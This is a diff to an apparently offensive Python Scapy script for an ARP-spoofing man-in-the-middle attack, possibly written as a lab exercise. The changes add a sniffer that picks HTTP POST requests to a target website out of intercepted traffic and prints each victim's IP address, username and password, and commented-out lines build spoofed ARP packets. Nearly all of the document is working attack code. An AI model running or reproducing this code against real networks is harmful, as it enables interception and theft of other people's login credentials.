@@ -106,14 +106,17 @@ def arp():
 # 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
 # 		sendp(spoof_ap_pkt)
 
-def http_sniff(packet):
-	s = str(packet[TCP].payload).split('\n')
-	print(s)
-	result = re.match(r'^usr\S*', s[-1])
-	if result is not None:
-		up = str(result.group(0)).split('&')
-		print('src_ip', packet[IP].src, 'user: ', up[0].split('=')[1],
-	            'password', up[1].split('=')[1])
+def show_http_pkt(packet):
+	if packet.haslayer(HTTPRequest):
+		method = packet[HTTPRequest].Method.decode()
+		if(packet[IP].dst == TARGET_WEBSITE  and packet.haslayer(Raw) and method == "POST"):
+			raw_data = packet[Raw].load
+			match = re.split(r'&', raw_data.decode())
+			usr_name = re.split(r'=', match[0])[1]
+			usr_pwd = re.split(r'=', match[1])[1]
+			print(usr_name,usr_pwd)
+			print('src_ip', packet[IP].src, 'user: ', usr_name,
+		            'password', usr_pwd)
 
 
 
@@ -126,9 +129,7 @@ def middle_man():
 	# result, un = sr(IP(src='140.113.207.246', dst=attacker_ip)/
 	# 	TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
 	# result.show()
-	sniff(count=0, store=1, prn=http_sniff, lfilter=lambda x: x.haslayer(TCP)
-            and x[IP].dst == TARGET_WEBSITE
-            and x[IP].dport == 80)
+	sniff(count=0, prn = show_http_pkt, filter="port 80")
 
 def DNS_inter():
 	sniff(count=0, prn = show_http_pkt, filter="port 53")
